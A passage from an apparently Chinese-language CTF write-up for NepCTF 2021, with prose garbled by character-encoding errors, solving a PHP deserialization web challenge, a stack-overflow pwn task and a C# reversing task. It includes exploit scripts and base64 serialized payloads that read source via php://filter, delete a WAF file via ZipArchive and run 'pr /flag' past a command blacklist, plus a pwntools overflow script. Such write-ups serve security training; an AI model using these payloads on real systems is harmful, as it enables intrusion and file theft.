punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œå­˜åœ¨waf.txtï¼Œ<code>file_get_contents</code>ä¸ºtrueï¼Œå³å­˜åœ¨waf.txtæ—¶ä¼š<code>file_get_contents($filename.&quot;.php&quot;);</code>ï¼Œå¦åˆ™ä¼š<code>shell($content);</code>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦åˆ©ç”¨ä¼ªåè®®è¯»å–<code>shell.php</code>çš„å†…å®¹ã€‚</p><p>exp1.phpå¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç›®å½•ä¸‹å¿…é¡»æœ‰ shell.php waf.txt</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>è¯»å–åˆ°<code>shell.php</code>å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å°±æ˜¯ä¼ å…¥ä¸€ä¸ªå‘½ä»¤ï¼Œè¿‡æ»¤ä¸€å †è¯»å–å‡½æ•°ç„¶åé•¿åº¦è¦å°äº10å¹¶è¯»å–flagã€‚</p><p>ç¨åå†ç ”ç©¶ï¼Œé‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯è¿›shellå‡½æ•°ï¼Œç„¶è€Œè¿›shellå‡½æ•°å†™æ­»äº†å¿…é¡»è¦waf.txtä¸å­˜åœ¨ã€‚ä½†waf.txtæ˜¯æœ‰çš„</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>è¿™å°±ä¸ºéš¾æˆ‘èƒ–è™äº†ï¼Œæ€è·¯è‡³æ­¤overäº†ã€‚</p><hr><h5 id="åˆ é™¤waf-txtï¼š"><a href="#åˆ é™¤waf-txtï¼š" class="headerlink" title="åˆ é™¤waf.txtï¼š"></a>åˆ é™¤waf.txtï¼š</h5><p>å¯»æ‰¾å¤§ä½¬åšå®¢æ–‡ç« ï¼Œæ‰¾åˆ°äº†æŒ‡å¼•æ€è·¯çš„<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">æ–‡ç« </a>ï¼Œ2019bytectfçš„ä¸€é“webé¢˜EzCMSï¼ŒåŸé¢˜è¦åˆ é™¤/è¦†ç›–ç›®å½•ä¸‹<code>.hatccess</code>ï¼Œåˆšå¥½æœ¬é¢˜çš„loginç±»æœ‰æ¼æ´å¯å¯»ï¼Œphpæ‰‹å†Œé‡ŒæŸ¥æ‰¾opençš„åŒåå‡½æ•°ï¼Œåˆ©ç”¨<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>ï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•°é‡Œå­˜åœ¨èƒ½è¦†ç›–æŒ‡å®šæ–‡ä»¶çš„æ¨¡å¼ï¼Œç›´æ¥åˆ æ‰<code>waf.txt</code></p><p>äºæ˜¯å‡†å¤‡å¥½äº†pharæ–‡ä»¶å‡†å¤‡â€˜è¿œç¨‹pharâ€™ååºåˆ—åŒ–ï¼Œä½†æ˜¯pharä¼ªåè®®æ˜¯ä¸å¯ä»¥è¿œç¨‹çš„</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>å­©å­æ¯”è¾ƒå‘†ï¼Œæµ‹äº†æœ‰ä¸€ä¼šã€‚è¿™é‡Œå—åˆ°äº†é‚£é¢˜å›ºæœ‰æ€ç»´çš„å½±å“ï¼Œå…¶å®å¹¶ä¸éœ€è¦æ‰“pharååºåˆ—åŒ–çš„ï¼Œç”±loginç±»ä¸­checkingå‡½æ•°<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>ï¼Œç›´æ¥ä»¤Gameç±»çš„file newä¸€ä¸ªZipArchive()ï¼Œfilenameå³ä¸ºwaf.txtï¼Œcontentä¸ºæ¨¡å¼<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>ï¼Œä¹Ÿå°±æ˜¯9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>æµ‹è¯•å¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>å¯è§waf.txtæˆåŠŸè¢«åˆ é™¤ï¼Œexp2å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'ç±»åŒä¸Š    '</span><span class="token single-quoted-string string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>æˆåŠŸåˆ é™¤waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="è¯»å–flagï¼š"><a href="#è¯»å–flagï¼š" class="headerlink" title="è¯»å–flagï¼š"></a>è¯»å–flagï¼š</h5><p>lsæ²¡è¿‡æ»¤ï¼Œæœ‰å…´è¶£å¯ä»¥æ‰§è¡Œlsçœ‹ä¸€çœ¼ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p><p>æœ€åä¸€æ­¥ï¼Œåˆ†æshell.phpï¼Œå¦‚ä½•åœ¨è¿‡æ»¤çš„æƒ…å†µä¸‹è¯»å–/flagï¼Œæœä¸€åœˆï¼Œæ‰¾åˆ°äº†linuxçš„å‘½ä»¤<code>pr</code></p><blockquote><p><strong>prå‘½ä»¤</strong> ç”¨æ¥å°†æ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆé€‚åˆæ‰“å°çš„æ ¼å¼ï¼Œå®ƒå¯ä»¥æŠŠè¾ƒå¤§çš„æ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªé¡µé¢è¿›è¡Œæ‰“å°ï¼Œå¹¶ä¸ºæ¯ä¸ªé¡µé¢æ·»åŠ æ ‡é¢˜ã€‚</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'  ç±»åŒä¸Š  '</span><span class="token single-quoted-string string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>æ‹¿åˆ°flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>è®°å½•ä¸€ä¸‹ï¼Œè·å–ç±»å‡½æ•°åçš„æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token single-quoted-string string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__call'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token single-quoted-string string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>æ ˆæº¢å‡ºï¼Œå¡«å……0x10ï¼Œç„¶åæ‰¾åˆ°system cat flagå‡½æ•°ï¼Œæ®åœ°å€éšæœºåŒ–åå­—èŠ‚ä¸å˜ï¼Œå°ç«¯æ›´æ”¹åœ°å€ï¼Œå½“å›¾ç‰‡åˆ·åˆ°å°èŒèšªçš„å›¾æ¡ˆä¾¿getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>åç¼–è¯‘å‡ºc#ä»£ç </p><p>å†™expï¼š</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">Î» python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>AesåŠ å¯†ç½‘ç«™ä¸€æ³¢ï¼š</p><img 